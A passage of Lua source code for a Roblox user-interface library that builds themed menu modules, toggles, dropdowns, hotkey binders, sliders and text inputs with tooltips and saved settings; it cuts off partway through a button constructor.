                m_ModuleRoot.BackgroundTransparency = 1
                m_ModuleRoot.BorderSizePixel = 0
                m_ModuleRoot.ZIndex = M_IndexOffset-1
                m_ModuleRoot.Parent = self.Menu
                
                 m_ModuleBackground = instNew('Frame')
                 m_ModuleBackground.BackgroundColor3 = RLTHEMEDATA['bo'][1]
                 m_ModuleBackground.BackgroundTransparency = RLTHEMEDATA['bo'][2]
                 m_ModuleBackground.BorderSizePixel = 0
                 m_ModuleBackground.Size = dimNew(1,0,0,25)
                 m_ModuleBackground.ZIndex = M_IndexOffset
                 m_ModuleBackground.Parent = m_ModuleRoot
                 
                 
                  m_ModuleEnableEffect = instNew('Frame')
                  m_ModuleEnableEffect.BackgroundColor3 = RLTHEMEDATA['tm'][1]
                  m_ModuleEnableEffect.BackgroundTransparency = 1
                  m_ModuleEnableEffect.ClipsDescendants = true
                  m_ModuleEnableEffect.Size = dimNew(1,0,1,0)
                  m_ModuleEnableEffect.BorderSizePixel = 0
                  m_ModuleEnableEffect.ZIndex = M_IndexOffset
                  m_ModuleEnableEffect.Parent = m_ModuleBackground
                  
                  m_Highlight = instNew('Frame')
                  m_Highlight.Size = dimScale(1,1)
                  m_Highlight.BackgroundColor3 = RLTHEMEDATA['ge'][1]
                  m_Highlight.BackgroundTransparency = 0.9
                  m_Highlight.Visible = false
                  m_Highlight.ZIndex = M_IndexOffset
                  m_Highlight.BorderSizePixel = 0
                  m_Highlight.Parent = m_ModuleBackground
                 
                 m_ModuleText = instNew('TextLabel')
                 m_ModuleText.BackgroundTransparency = 1
                 m_ModuleText.Font = RLTHEMEFONT
                 m_ModuleText.Position = dimOffset(0, 0)
                 m_ModuleText.RichText = true
                 m_ModuleText.Size = dimNew(1, 0, 1, 0)
                 m_ModuleText.Text = text
                 m_ModuleText.TextColor3 = RLTHEMEDATA['tm'][1]
                 m_ModuleText.TextSize = 20
                 m_ModuleText.TextStrokeColor3 = RLTHEMEDATA['to'][1]
                 m_ModuleText.TextStrokeTransparency = 0
                 m_ModuleText.TextXAlignment = 'Left'
                 m_ModuleText.ZIndex = M_IndexOffset
                 m_ModuleText.Parent = m_ModuleBackground
                 
                 m_ModulePadding = instNew('UIPadding')
                 m_ModulePadding.PaddingLeft = dimOffset(IndentLevel1, 0).X
                 m_ModulePadding.Parent = m_ModuleText
                 
                 m_ModuleIcon = instNew('ImageLabel')
                 m_ModuleIcon.AnchorPoint = vec2(1,0.5)
                 m_ModuleIcon.BackgroundTransparency = 1
                 m_ModuleIcon.Position = dimNew(1,-6, 0.5, 0)
                 m_ModuleIcon.Rotation = 0
                 m_ModuleIcon.Size = dimOffset(12, 12)
                 m_ModuleIcon.Image = 'rbxassetid://8997446977'
                 m_ModuleIcon.ImageColor3 = RLTHEMEDATA['tm'][1]
                 m_ModuleIcon.ZIndex = M_IndexOffset
                 m_ModuleIcon.Parent = m_ModuleBackground
            end
                
            local M_Object = {} do 
                M_Object.Tooltip = nil
                
                
                M_Object.Flags = {} do 
                    M_Object.Flags['Clicked'] = true
                end
                
                M_Object.setvis = base_class.module_setvis
                M_Object.Root = m_ModuleRoot
                
                M_Object.Highlight = m_Highlight
                
                
                M_Object.Effect = m_ModuleEnableEffect
                
                M_Object.Name = text
                M_Object.ZIndex = M_IndexOffset
                
                M_Object.Click = base_class.module_click_self
                
                M_Object.Connect = base_class.generic_connect
                M_Object.setTooltip = base_class.generic_tooltip
            end
            
            do
                m_ModuleBackground.InputBegan:Connect(function(io) 
                    local uitv = io.UserInputType.Value
                    if (uitv == 0) then
                        M_Object:Click()
                        return
                    end
                end)
                
                m_ModuleBackground.MouseEnter:Connect(function() 
                    m_ModuleBackground.BackgroundColor3 = RLTHEMEDATA['ho'][1]
                    
                    
                    local tt = M_Object.Tooltip
                    if (tt) then
                        w_Tooltip.Text = tt
                        w_TooltipHeader.Text = M_Object.Name
                        w_TooltipHeader.Visible = true
                    end
                end)
                
                m_ModuleBackground.MouseLeave:Connect(function() 
                    m_ModuleBackground.BackgroundColor3 = RLTHEMEDATA['bo'][1]
                    
                    if (w_Tooltip.Text == M_Object.Tooltip) then
                        w_TooltipHeader.Visible = false
                    end
                end)
            end
            
            tabInsert(ui_Modules, M_Object)
            return M_Object
        end
    end
    base_class.module_create_label = function(self, text) 
        text = tostring(text)
                    
        local T_IndexOffset = self.ZIndex+1
        local t_Text
         local t_Padding
        do
            t_Text = instNew('TextLabel')
            t_Text.BackgroundColor3 = RLTHEMEDATA['bs'][1]
            t_Text.BackgroundTransparency = RLTHEMEDATA['bs'][2]
            t_Text.BorderSizePixel = 0
            t_Text.Font = RLTHEMEFONT
            t_Text.Parent = self.Menu
            t_Text.RichText = true
            t_Text.Size = dimNew(1, 0, 0, 25)
            t_Text.Text = text
            t_Text.TextColor3 = RLTHEMEDATA['tm'][1]
            t_Text.TextSize = 18
            t_Text.TextStrokeColor3 = RLTHEMEDATA['to'][1]
            t_Text.TextStrokeTransparency = 0
            t_Text.TextWrapped = true
            t_Text.TextXAlignment = 'Left'
            t_Text.TextYAlignment = 'Center'
            t_Text.ZIndex = T_IndexOffset
            
            t_Padding = instNew('UIPadding')
            t_Padding.PaddingLeft = dimOffset(IndentLevel2, 0).X -- LEFT PADDING 2
            t_Padding.Parent = t_Text
        end
        
        for i = 1, 25 do 
            if (t_Text.TextFits) then
                break
            end
            t_Text.Size += dimOffset(0,25)
        end
            
        local T_Object = {} do 
            T_Object.Tooltip = nil
            T_Object.Toggled = false
            
            T_Object.Name = text
            T_Object.setTooltip = base_class.generic_tooltip
        end
        
        do
            t_Text.MouseEnter:Connect(function()                     
                local tt = T_Object.Tooltip
                if (tt) then
                    w_Tooltip.Text = tt
                    w_TooltipHeader.Text = T_Object.Name
                    w_TooltipHeader.Visible = true
                end
            end)
            
            t_Text.MouseLeave:Connect(function() 
                
                if (w_Tooltip.Text == T_Object.Tooltip) then
                    w_TooltipHeader.Visible = false
                end
            end)
        end
        
        return T_Object            
    end
    base_class.module_create_toggle = function(self, text) 
        text = tostring(text)
        
        local T_IndexOffset = self.ZIndex+1
        
        
        local t_Toggle
         local t_Box1
          local t_Box2
         local t_Text
          local t_TextPadding
        
        do
            t_Toggle = instNew('Frame')
            t_Toggle.BackgroundColor3 = RLTHEMEDATA['bs'][1]
            t_Toggle.BackgroundTransparency = RLTHEMEDATA['bs'][2]
            t_Toggle.BorderSizePixel = 0
            t_Toggle.Size = dimNew(1, 0, 0, 25)
            t_Toggle.ZIndex = T_IndexOffset
            t_Toggle.Parent = self.Menu
             
             t_Text = instNew('TextLabel')
             t_Text.Size = dimScale(1, 1)
             t_Text.BackgroundTransparency = 1
             t_Text.Font = RLTHEMEFONT
             t_Text.TextXAlignment = 'Left'
             t_Text.TextColor3 = RLTHEMEDATA['tm'][1]
             t_Text.TextSize = 18
             t_Text.Text = text
             t_Text.TextStrokeTransparency = 0
             t_Text.TextStrokeColor3 = RLTHEMEDATA['to'][1]
             t_Text.ZIndex = T_IndexOffset
             t_Text.Parent = t_Toggle
             
              t_TextPadding = instNew('UIPadding')
              t_TextPadding.PaddingLeft = dimOffset(IndentLevel2, 0).X -- LEFT PADDING 2
              t_TextPadding.Parent = t_Text
             
             t_Box1 = instNew('Frame')
             t_Box1.AnchorPoint = vec2(1,0)
             t_Box1.BackgroundColor3 = RLTHEMEDATA['sf'][1]
             t_Box1.BackgroundTransparency = 1
             t_Box1.BorderSizePixel = 0
             t_Box1.Position = dimNew(1,-RightIndent,0.5,-5) -- RIGHT PADDING
             t_Box1.Size = dimOffset(10, 10)
             t_Box1.ZIndex = T_IndexOffset
             t_Box1.Parent = t_Toggle
             
             stroke(t_Box1)
             
             t_Box2 = instNew('Frame')
             t_Box2.Size = dimOffset(8, 8)
             t_Box2.Position = dimOffset(1,1)
             t_Box2.BackgroundTransparency = 1
             t_Box2.BackgroundColor3 = RLTHEMEDATA['ge'][1]
             t_Box2.BorderSizePixel = 0
             t_Box2.Visible = true
             t_Box2.ZIndex = T_IndexOffset
             t_Box2.Parent = t_Box1
        end
            
        local T_Object = {} do 
            T_Object.Tooltip = nil
            T_Object.Toggled = false
            
            T_Object.Flags = {}
            T_Object.Flags['Enabled'] = true
            T_Object.Flags['Disabled'] = true
            T_Object.Flags['Toggled'] = true
            
            T_Object.Icon = t_Box2
            T_Object.Name = text
            T_Object.PName = self.Name
            
            T_Object.Toggle = base_class.s_toggle_self
            T_Object.Disable = base_class.s_toggle_disable
            T_Object.Enable = base_class.s_toggle_enable
            T_Object.Reset = base_class.s_toggle_reset
            T_Object.getState = base_class.s_toggle_getstate
            T_Object.getValue = base_class.s_toggle_getstate
            T_Object.isEnabled = base_class.s_toggle_getstate
            
            T_Object.Connect = base_class.generic_connect
            T_Object.setTooltip = base_class.generic_tooltip
        end
        
        do
            if Configs[self.Name] then
                if Configs[self.Name]["Extras"][text] == true then
                    T_Object:Toggle()
                end
            end
            t_Toggle.InputBegan:Connect(function(io) 
                local uitv = io.UserInputType.Value
                if (uitv == 0) then
                    T_Object:Toggle()
                    return
                end
            end)
            
            t_Toggle.MouseEnter:Connect(function() 
                t_Toggle.BackgroundColor3 = RLTHEMEDATA['hs'][1]
                
                local tt = T_Object.Tooltip
                if (tt) then
                    w_Tooltip.Text = tt
                    w_TooltipHeader.Text = T_Object.Name
                    w_TooltipHeader.Visible = true
                end
            end)
            
            t_Toggle.MouseLeave:Connect(function() 
                t_Toggle.BackgroundColor3 = RLTHEMEDATA['bs'][1]
                
                if (w_Tooltip.Text == T_Object.Tooltip) then
                    w_TooltipHeader.Visible = false
                end
            end)
        end
        
        return T_Object            
    end
    base_class.module_create_dropdown = function(self, text, primary) 
        text = tostring(text)
        primary = primary or false
        
        local D_IndexOffset = self.ZIndex+1
        
        local d_Root
         local d_Header
          local d_HeaderText
           local d_TextPadding
          local d_HeaderIcon
          
          
          local d_Menu
           local d_MenuListLayout
        
        do
            d_Root = instNew('Frame')
            d_Root.Size = dimNew(1, 0, 0, 25)
            d_Root.AutomaticSize = 'Y'
            d_Root.BackgroundTransparency = 1
            d_Root.BorderSizePixel = 0
            d_Root.ZIndex = D_IndexOffset-1
            d_Root.Parent = self.Menu
        
             d_Header = instNew('Frame')
             d_Header.Active = true
             d_Header.BackgroundColor3 = RLTHEMEDATA['bs'][1]
             d_Header.BackgroundTransparency = RLTHEMEDATA['bs'][2]
             d_Header.BorderSizePixel = 0
             d_Header.Size = dimNew(1, 0, 0, 25)
             d_Header.ZIndex = D_IndexOffset+1
             d_Header.Parent = d_Root
             
              d_HeaderText = instNew('TextLabel')
              d_HeaderText.Size = dimScale(1, 1)
              d_HeaderText.BackgroundTransparency = 1
              d_HeaderText.Font = RLTHEMEFONT
              d_HeaderText.TextXAlignment = 'Left'
              d_HeaderText.TextColor3 = RLTHEMEDATA['tm'][1]
              d_HeaderText.TextSize = 18
              d_HeaderText.Text = text
              d_HeaderText.TextStrokeTransparency = 0
              d_HeaderText.TextStrokeColor3 = RLTHEMEDATA['to'][1]
              d_HeaderText.ZIndex = D_IndexOffset+1
              d_HeaderText.Parent = d_Header
              
               d_TextPadding = instNew('UIPadding')
               d_TextPadding.PaddingLeft = dimOffset(IndentLevel2, 0).X -- LEFT PADDING 2
               d_TextPadding.Parent = d_HeaderText
              
              d_HeaderIcon = instNew('ImageLabel')
              d_HeaderIcon.Size = dimOffset(25, 25)
              d_HeaderIcon.Position = dimNew(1,-RightIndent +10, 0, 0) -- RIGHT PADDING
              d_HeaderIcon.AnchorPoint = vec2(1,0)
              d_HeaderIcon.BackgroundTransparency = 1
              d_HeaderIcon.ImageColor3 = RLTHEMEDATA['tm'][1]
              d_HeaderIcon.Image = 'rbxassetid://7184113125'
              d_HeaderIcon.Rotation = 180
              d_HeaderIcon.ZIndex = D_IndexOffset+1
              d_HeaderIcon.Parent = d_Header
             
             d_Menu = instNew('Frame')
             d_Menu.Size = dimNew(1,0,0,0)
             d_Menu.AutomaticSize = 'Y'
             d_Menu.Position = dimOffset(0, 25)
             d_Menu.BackgroundColor3 = RLTHEMEDATA['bd'][1]
             d_Menu.BackgroundTransparency = 1
             d_Menu.BorderSizePixel = 0
             d_Menu.ZIndex = D_IndexOffset
             d_Menu.Visible = false
             d_Menu.Parent = d_Header
             
              d_MenuListLayout = instNew('UIListLayout')
              d_MenuListLayout.FillDirection = 'Vertical'
              d_MenuListLayout.HorizontalAlignment = 'Left'
              d_MenuListLayout.VerticalAlignment = 'Top'
              d_MenuListLayout.Parent = d_Menu
        end
        
        local D_Object = {} do 
            D_Object.Tooltip = nil
            D_Object.MToggled = false
            
            D_Object.Primary = primary
            
            D_Object.Menu = d_Menu
            D_Object.Name = text
            D_Object.Parent = self
            D_Object.Icon = d_HeaderIcon
            D_Object.ZIndex = D_IndexOffset
            
            D_Object.Selection = nil
            
            D_Object.Objects = {}
            
            
            D_Object.Flags = {}
            D_Object.Flags['Changed'] = true
            D_Object.Flags['Opened'] = true
            D_Object.Flags['Closed'] = true
            
            D_Object.Toggle = base_class.s_dropdown_toggle
            D_Object.GetSelection = base_class.s_dropdown_getselection
            D_Object.getValue = base_class.s_dropdown_getselection
            
            D_Object.Connect = base_class.generic_connect
            D_Object.setTooltip = base_class.generic_tooltip
            D_Object.addOption = base_class.dropdown_create_option
        end
        
        do
            d_Header.InputBegan:Connect(function(io) 
                local uitv = io.UserInputType.Value
                if (uitv == 0 or uitv == 1) then
                    D_Object:Toggle()
                    return
                end
            end)
            
            d_Header.MouseEnter:Connect(function() 
                d_Header.BackgroundColor3 = RLTHEMEDATA['hs'][1]
                
                local tt = D_Object.Tooltip
                if (tt) then
                    w_Tooltip.Text = tt
                    w_TooltipHeader.Text = D_Object.Name
                    w_TooltipHeader.Visible = true
                end
            end)
            
            d_Header.MouseLeave:Connect(function() 
                d_Header.BackgroundColor3 = RLTHEMEDATA['bs'][1]
                
                if (w_Tooltip.Text == D_Object.Tooltip) then
                    w_TooltipHeader.Visible = false
                end
            end)
        end
        
        return D_Object
    end
    base_class.module_create_modhotkey = function(self, hotkey) 
        local H_IndexOffset = self.ZIndex+1
        
        local h_Hotkey
         local h_Text
          local h_TextPadding
        
        do
            h_Hotkey = instNew('Frame')
            h_Hotkey.BackgroundColor3 = RLTHEMEDATA['bs'][1]
            h_Hotkey.BackgroundTransparency = RLTHEMEDATA['bs'][2]
            h_Hotkey.BorderSizePixel = 0
            h_Hotkey.Size = dimNew(1, 0, 0, 25)
            h_Hotkey.ZIndex = H_IndexOffset
            h_Hotkey.Parent = self.Menu
             
             h_Text = instNew('TextLabel')
             h_Text.Size = dimScale(1, 1)
             h_Text.BackgroundTransparency = 1
             h_Text.Font = RLTHEMEFONT
             h_Text.TextXAlignment = 'Left'
             h_Text.TextColor3 = RLTHEMEDATA['tm'][1]
             h_Text.TextSize = 18
             h_Text.Text = 'Hotkey: N/A'
             h_Text.TextStrokeTransparency = 0
             h_Text.TextStrokeColor3 = RLTHEMEDATA['to'][1]
             h_Text.ZIndex = H_IndexOffset
             h_Text.Parent = h_Hotkey
             
              h_TextPadding = instNew('UIPadding')
              h_TextPadding.PaddingLeft = dimOffset(IndentLevel2, 0).X -- LEFT PADDING 2
              h_TextPadding.Parent = h_Text
                
        end
            
        local H_Object = {} do 
            H_Object.Label = h_Text
            H_Object.Hotkey = nil
            
            H_Object.Parent = self
            H_Object.Tooltip = nil
            
            H_Object.Flags = {}
            H_Object.Flags['HotkeySet'] = true
            
            H_Object.setHotkey = base_class.s_modhotkey_sethotkey
            H_Object.setNewHotKey = base_class.s_modhoykey_setnewhotkey
            H_Object.GetHotkey = base_class.s_modhotkey_gethotkey
            H_Object.getValue = base_class.s_modhotkey_gethotkey
            
            H_Object.Connect = base_class.generic_connect
            H_Object.setTooltip = base_class.generic_tooltip
        end
        
        do
            if Configs[self.Name] then
                if Configs[self.Name]["Keybind"] ~= "" then
                    H_Object:setNewHotKey(Configs[self.Name]["Keybind"])
                end
            end
            -- H_Object:setNewHotKey(Enum.KeyCode.R)
            h_Hotkey.InputBegan:Connect(function(io) 
                local uitv = io.UserInputType.Value
                if (uitv == 0) then
                    H_Object:setHotkey()
                    return
                end
            end)
            
            h_Hotkey.MouseEnter:Connect(function() 
                h_Hotkey.BackgroundColor3 = RLTHEMEDATA['hs'][1]
            end)
            
            h_Hotkey.MouseLeave:Connect(function() 
                h_Hotkey.BackgroundColor3 = RLTHEMEDATA['bs'][1]
            end)
        end
        
        return H_Object   
    end
    base_class.module_create_hotkey = function(self, text) 
        local H_IndexOffset = self.ZIndex+1
        
        local h_Hotkey
         local h_Text
          local h_TextPadding
        
        do
            h_Hotkey = instNew('Frame')
            h_Hotkey.BackgroundColor3 = RLTHEMEDATA['bs'][1]
            h_Hotkey.BackgroundTransparency = RLTHEMEDATA['bs'][2]
            h_Hotkey.BorderSizePixel = 0
            h_Hotkey.Size = dimNew(1, 0, 0, 25)
            h_Hotkey.ZIndex = H_IndexOffset
            h_Hotkey.Parent = self.Menu
             
             h_Text = instNew('TextLabel')
             h_Text.Size = dimScale(1, 1)
             h_Text.BackgroundTransparency = 1
             h_Text.Font = RLTHEMEFONT
             h_Text.TextXAlignment = 'Left'
             h_Text.TextColor3 = RLTHEMEDATA['tm'][1]
             h_Text.TextSize = 18
             h_Text.Text = tostring(text)..': N/A'
             h_Text.TextStrokeTransparency = 0
             h_Text.TextStrokeColor3 = RLTHEMEDATA['to'][1]
             h_Text.ZIndex = H_IndexOffset
             h_Text.Parent = h_Hotkey
             
             h_TextPadding = instNew('UIPadding')
             h_TextPadding.PaddingLeft = dimOffset(IndentLevel2, 0).X -- LEFT PADDING 2
             h_TextPadding.Parent = h_Text
        end
            
        local H_Object = {} do 
            H_Object.Label = h_Text
            H_Object.Hotkey = nil
            
            H_Object.Parent = self
            H_Object.Tooltip = nil
            
            H_Object.Name = tostring(text)
            H_Object.Flags = {}
            H_Object.Flags['HotkeySet'] = true
            
            H_Object.bind = base_class.s_hotkey_sethotkey
            H_Object.setHotkey = base_class.s_hotkey_sethotkeyexplicit
            H_Object.GetHotkey = base_class.s_hotkey_gethotkey
            H_Object.getValue = base_class.s_hotkey_gethotkey
            
            H_Object.Connect = base_class.generic_connect
            H_Object.setTooltip = base_class.generic_tooltip
        end
        
        do
            h_Hotkey.InputBegan:Connect(function(io) 
                local uitv = io.UserInputType.Value
                if (uitv == 0) then
                    H_Object:bind()
                    return
                end
            end)
            
            h_Hotkey.MouseEnter:Connect(function() 
                h_Hotkey.BackgroundColor3 = RLTHEMEDATA['hs'][1]
                
                local tt = H_Object.Tooltip
                if (tt) then
                    w_Tooltip.Text = tt
                    w_TooltipHeader.Text = H_Object.Name
                    w_TooltipHeader.Visible = true
                end
            end)
            
            h_Hotkey.MouseLeave:Connect(function() 
                h_Hotkey.BackgroundColor3 = RLTHEMEDATA['bs'][1]
                
                if (w_Tooltip.Text == H_Object.Tooltip) then
                    w_TooltipHeader.Visible = false
                end
            end)
        end
        
        return H_Object   
    end
    base_class.module_create_slider = function(self, text, args, primary) 
        text = tostring(text)
        local newval = nil
        if Configs[self.Name] then
            newval = Configs[self.Name]["Extras"][text]
        end
        
        args['min'] = args['min'] or 0
        args['max'] = args['max'] or 100
        args['cur'] = newval or args['cur'] or args['min']
        args['step'] = args['step'] or 1
        
        
        local S_IndexOffset = self.ZIndex+1
        
        local s_Slider
         local s_InputBox
         local s_Text
          local s_TextPad
         local s_Amount
         local s_SliderBarBg
          local s_SliderBar
          
        do
            s_Slider = instNew('Frame')
            s_Slider.BackgroundColor3 = RLTHEMEDATA['bs'][1]
            s_Slider.BackgroundTransparency = RLTHEMEDATA['bs'][2]
            s_Slider.BorderSizePixel = 0
            s_Slider.Size = dimNew(1, 0, 0, 25)
            s_Slider.ZIndex = S_IndexOffset
            s_Slider.Parent = self.Menu
             
             s_InputBox = instNew('TextBox')
             s_InputBox.BackgroundColor3 = RLTHEMEDATA['bs'][1]
             s_InputBox.BackgroundTransparency = 0.1--RLTHEMEDATA['bs'][2]
             s_InputBox.BorderSizePixel = 0
             s_InputBox.Font = RLTHEMEFONT
             s_InputBox.Size = dimNew(1, 0, 1, 0)
             s_InputBox.PlaceholderText = 'Enter new value'
             s_InputBox.TextColor3 = RLTHEMEDATA['tm'][1]
             s_InputBox.TextSize = 18
             s_InputBox.TextStrokeColor3 = RLTHEMEDATA['to'][1]
             s_InputBox.TextStrokeTransparency = 0
             s_InputBox.TextXAlignment = 'Center'
             s_InputBox.Visible = false
             s_InputBox.ZIndex = S_IndexOffset + 3
             s_InputBox.Parent = s_Slider
             
             s_Text = instNew('TextLabel')
             s_Text.BackgroundColor3 = RLTHEMEDATA['bs'][1]
             s_Text.BackgroundTransparency = 0.2
             s_Text.BorderSizePixel = 0
             s_Text.Font = RLTHEMEFONT
             s_Text.Size = dimScale(1, 1)
             s_Text.Text = text
             s_Text.TextColor3 = RLTHEMEDATA['tm'][1]
             s_Text.TextSize = 18
             s_Text.TextStrokeColor3 = RLTHEMEDATA['to'][1]
             s_Text.TextStrokeTransparency = 0
             s_Text.TextXAlignment = 'Left'
             s_Text.Visible = true
             s_Text.ZIndex = S_IndexOffset + 1
             s_Text.Parent = s_Slider
              
              s_TextPad = instNew('UIPadding')
              s_TextPad.PaddingLeft = dimOffset(IndentLevel2, 0).X -- LEFT PADDING 2
              s_TextPad.Parent = s_Text 
             
             s_Amount = instNew('TextLabel')
             s_Amount.Size = dimNew(0, 30, 1, 0)
             s_Amount.Position = dimNew(1,-RightIndent, 0, 0) -- RIGHT PADDING
             s_Amount.AnchorPoint = vec2(1,0)
             s_Amount.BackgroundTransparency = 1
             s_Amount.BorderSizePixel = 0
             s_Amount.Font = RLTHEMEFONT
             s_Amount.TextXAlignment = 'Right'
             s_Amount.TextColor3 = RLTHEMEDATA['tm'][1]
             s_Amount.TextSize = 18
             s_Amount.Visible = true
             s_Amount.TextStrokeTransparency = 0
             s_Amount.TextStrokeColor3 = RLTHEMEDATA['to'][1]
             s_Amount.ZIndex = S_IndexOffset + 1 
             s_Amount.Parent = s_Slider
             
             s_SliderBarBg = instNew('Frame')
             s_SliderBarBg.BackgroundColor3 = RLTHEMEDATA['sb'][1]
             s_SliderBarBg.BackgroundTransparency = RLTHEMEDATA['sb'][2]
             s_SliderBarBg.BorderSizePixel = 0
             s_SliderBarBg.ClipsDescendants = true
             s_SliderBarBg.Position = dimNew(0, 8, 0.5, -3)
             s_SliderBarBg.Size = dimNew(1, -16, 0, 6)
             s_SliderBarBg.ZIndex = S_IndexOffset
             s_SliderBarBg.Parent = s_Slider
             
              s_SliderBar = instNew('Frame')
              s_SliderBar.Size = dimScale(1, 1)
              s_SliderBar.Position = dimNew(0,0)
              s_SliderBar.AnchorPoint = vec2(1, 0)
              s_SliderBar.BackgroundColor3 = RLTHEMEDATA['sf'][1]
              s_SliderBar.BackgroundTransparency = RLTHEMEDATA['sf'][2]
              s_SliderBar.BorderSizePixel = 0
              s_SliderBar.ZIndex = S_IndexOffset
              s_SliderBar.Parent = s_SliderBarBg
              
            stroke(s_SliderBarBg, nil, 0.7)
             
        end
        
        local StepFormat
        
        if (args['step'] < 1) then
            StepFormat = (
                '%.'..
                (
                    (('%.0e'):format(args['step'])):match('e%-0(%d)')
                )..
                'f'
            )
            
            if (StepFormat == '%.f') then
                error('FATAL ERROR WHEN MAKING SLIDER\nCOULDN\'T MAKE STEPFORMAT PROPERLY\nTELL ME IF YOU SEE THIS')
                return
            end
        else
            StepFormat = '%d'
        end
        
        s_Amount.Text = StepFormat:format(args['cur'])
        
        
        local DragConn
            
        local S_Object = {} do 
            S_Object.Tooltip = nil
            S_Object.Name = text
			S_Object.PName = self.Name
            
            S_Object.SliderFill = s_SliderBar
            S_Object.SliderBg = s_SliderBarBg
            S_Object.SliderAmnt = s_Amount
            
            
            S_Object.SliderSize = s_SliderBarBg.AbsoluteSize.X
            
            S_Object.CurrentVal = args['cur']
            S_Object.PreviousVal = nil
            S_Object.Min = args['min']
            S_Object.Max = args['max']
            S_Object.Step = args['step']
            S_Object.Ratio = S_Object.SliderSize / (S_Object.Max - S_Object.Min)
            S_Object.RatioInverse = 1 / S_Object.Ratio
            S_Object.StepFormat = StepFormat
            
            
            S_Object.Parent = self
            S_Object.Primary = primary or false
            
            
            
            S_Object.Flags = {}
            S_Object.Flags['Changed'] = true
            
            S_Object.getValue = base_class.s_slider_getval
            S_Object.SetValue = base_class.s_slider_setvalnum
            S_Object.SetValuePos = base_class.s_slider_setvalpos
            
            S_Object.Connect = base_class.generic_connect
            S_Object.setTooltip = base_class.generic_tooltip
        end
        
        S_Object:SetValue(args['cur'])
        
        do
            s_Slider.MouseEnter:Connect(function() 
                s_Slider.BackgroundColor3 = RLTHEMEDATA['hs'][1]
                
                s_Amount.TextXAlignment = 'Center'
                twn(s_Text, {BackgroundTransparency = 1, TextTransparency = 1, TextStrokeTransparency = 1},true)
                twn(s_Amount, {Position = dimNew(0.5,IndentLevel2,0,0)}, true) -- LEFT PADDING 2
                
                local tt = S_Object.Tooltip
                if (tt) then
                    w_Tooltip.Text = tt
                    w_TooltipHeader.Text = S_Object.Name
                    w_TooltipHeader.Visible = true
                end
            end)
            
            s_Slider.MouseLeave:Connect(function() 
                s_Slider.BackgroundColor3 = RLTHEMEDATA['bs'][1]
                -- deez nuts
                s_Amount.TextXAlignment = 'Right'
                twn(s_Text, {BackgroundTransparency = 0.2, TextTransparency = 0, TextStrokeTransparency = 0},true)
                twn(s_Amount, {Position = dimNew(1,-RightIndent,0,0)}, true) -- RIGHT PADDING
                
                if (w_Tooltip.Text == S_Object.Tooltip) then
                    w_TooltipHeader.Visible = false
                end
            end)
            
            s_Slider.InputBegan:Connect(function(io) 
                local v = io.UserInputType.Value
                if (v == 0) then
                    S_Object:SetValuePos(io.Position.X)
                    
                    DragConn = servInput.InputChanged:Connect(function(io) 
                        if (io.UserInputType.Value == 4) then
                            S_Object:SetValuePos(io.Position.X)
                        end
                    end)
                elseif (v == 1) then
                    s_InputBox.Visible = true
                    s_InputBox:CaptureFocus()
                    s_InputBox.Text = ''
                end
            end)
            
            s_Slider.InputEnded:Connect(function(io) 
                if (io.UserInputType.Value == 0) then
                    DragConn:Disconnect()
                end
            end)
            
            s_InputBox.FocusLost:Connect(function(enter) 
                if not enter then return end
                
                local t = s_InputBox.Text
                local a = tonumber(t)
                if (a == nil) then
                    if (t == '') then
                        s_InputBox.Visible = false
                    else
                        s_InputBox.Text = 'Not a number'
                    end
                else
                    S_Object:SetValue(a)
                    s_InputBox.Visible = false
                end
            end)
        end
        return S_Object            
    end
    base_class.module_create_input = function(self, text) 
        text = tostring(text)
        local I_IndexOffset = self.ZIndex + 1 
        
        local i_Input
         local i_TextPad
         local i_Icon
        do
            
            i_Input = instNew('TextBox')
            i_Input.BackgroundColor3 = RLTHEMEDATA['bs'][1]
            i_Input.BackgroundTransparency = RLTHEMEDATA['bs'][2]
            i_Input.BorderSizePixel = 0 
            i_Input.ClearTextOnFocus = true
            i_Input.Font = RLTHEMEFONT
            i_Input.Size = dimNew(1, 0, 0, 25)
            i_Input.Text = text
            i_Input.TextColor3 = RLTHEMEDATA['tm'][1]
            i_Input.TextSize = 18
            i_Input.TextStrokeColor3 = RLTHEMEDATA['to'][1]
            i_Input.TextStrokeTransparency = 0
            i_Input.TextWrapped = true
            i_Input.TextXAlignment = 'Left'
            i_Input.ZIndex = I_IndexOffset
            i_Input.Parent = self.Menu
             
             i_TextPad = instNew('UIPadding')
             i_TextPad.PaddingLeft = dimOffset(IndentLevel2, 0).X -- LEFT PADDING 2
             i_TextPad.Parent = i_Input
            
            i_Icon = instNew('ImageLabel')
            i_Icon.AnchorPoint = vec2(1,0.5)
            i_Icon.Position = dimNew(1,-4, 0.5, 0)                
            i_Icon.BackgroundTransparency = 1
            i_Icon.Image = 'rbxassetid://8997447289'
            i_Icon.Rotation = 0
            i_Icon.Size = dimOffset(12, 12)
            i_Icon.ZIndex = I_IndexOffset
            i_Icon.Parent = i_Input
        end
            
        local I_Object = {} do 
            I_Object.Tooltip = nil
            
            
            I_Object.Flags = {} do 
                I_Object.Flags['Focused'] = true
                I_Object.Flags['Unfocused'] = true
                I_Object.Flags['TextChanged'] = true
            end
            
            I_Object.Name = text
            I_Object.ZIndex = I_IndexOffset
            
            I_Object.Connect = base_class.generic_connect
            I_Object.setTooltip = base_class.generic_tooltip
        end
        
        do
            i_Input.MouseEnter:Connect(function() 
                i_Input.BackgroundColor3 = RLTHEMEDATA['hs'][1]
                
                
                local tt = I_Object.Tooltip
                if (tt) then
                    w_Tooltip.Text = tt
                    w_TooltipHeader.Text = I_Object.Name
                    w_TooltipHeader.Visible = true
                end
            end)
            
            i_Input.MouseLeave:Connect(function() 
                i_Input.BackgroundColor3 = RLTHEMEDATA['bs'][1]
                
                if (w_Tooltip.Text == I_Object.Tooltip) then
                    w_TooltipHeader.Visible = false
                end
            end)
            
            i_Input.FocusLost:Connect(function(enter) 
                pcall(I_Object.Flags.Unfocused, i_Input.Text, enter)
                i_Input.Text = I_Object.Name
            end)
            i_Input.Focused:Connect(function() 
                pcall(I_Object.Flags.Focused)
            end)
            i_Input:GetPropertyChangedSignal('Text'):Connect(function() 
                pcall(I_Object.Flags.TextChanged, i_Input.Text)
            end)
        end
        
        return I_Object
    end
    base_class.module_create_button = function(self, text) 
        text = tostring(text)
        
        local B_IndexOffset = self.ZIndex + 1
        
        local b_Background
         local b_EnableEffect
         local b_Text
          local b_TextPadding
         local b_Icon
        
        do
            b_Background = instNew('Frame')
            b_Background.BackgroundColor3 = RLTHEMEDATA['bs'][1] 
            b_Background.BackgroundTransparency = RLTHEMEDATA['bs'][2]
            b_Background.BorderSizePixel = 0
            b_Background.Size = dimNew(1,0,0,25)
